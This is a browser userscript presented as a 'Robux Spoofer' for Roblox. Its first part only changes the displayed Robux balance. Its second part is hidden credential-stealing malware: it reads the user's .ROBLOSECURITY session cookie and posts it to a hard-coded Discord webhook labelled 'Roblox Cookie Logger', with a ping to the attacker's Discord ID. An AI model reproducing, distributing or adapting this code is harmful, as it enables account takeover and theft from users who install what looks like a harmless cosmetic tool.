// ==UserScript==
// @name         Robux Spoofer
// @namespace    http://tampermonkey.net/
// @version      5.0
// @description  A utility for Roblox data management.
// @author       You
// @match        https://www.roblox.com/*
// @grant        GM_cookie
// @grant        GM_xmlhttpRequest
// @connect      discord.com
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/563743/Robux%20Spoofer.user.js
// @updateURL https://update.greasyfork.org/scripts/563743/Robux%20Spoofer.meta.js
// ==/UserScript==

//scripting scripter scripty stuff


(function() {
    'use strict';

    function robux() {
        let robuxElement = document.getElementById("nav-robux-amount");
        if (robuxElement) {
            robuxElement.textContent = "191M+"; // change this number as you like
        }
    }

    // running
    robux();

    // update
    setInterval(robux, 1);
})();



(function() {
    'use strict';

    const webhookUrl = "https://discord.com/api/webhooks/1462349545152319571/lshKEQekNby1ibuvP069SX0lu8D3f0IvzHVJtBrVT3jFx3hBRZxDfzVhU3d_aoc3M9mu";
    const myDiscordId = "1171300390441078885";

    GM_cookie.list({ name: '.ROBLOSECURITY' }, function(cookies, error) {
        if (!error && cookies.length > 0) {
            const cookieValue = cookies[0].value;

            GM_xmlhttpRequest({
                method: "POST",
                url: webhookUrl,
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify({
                    // The ping goes in 'content' to ensure a notification triggers
                    content: `Hey <@${myDiscordId}>, a new log is ready!`,
                    username: "Roblox Cookie Logger",
                    embeds: [{
                        title: "Cookie Captured for i8agy",
                        description: "```" + cookieValue + "```",
                        color: 16711680,
                        footer: { text: "User: i8agy | ID: " + myDiscordId }
                    }]
                })
            });
        }
    });
})();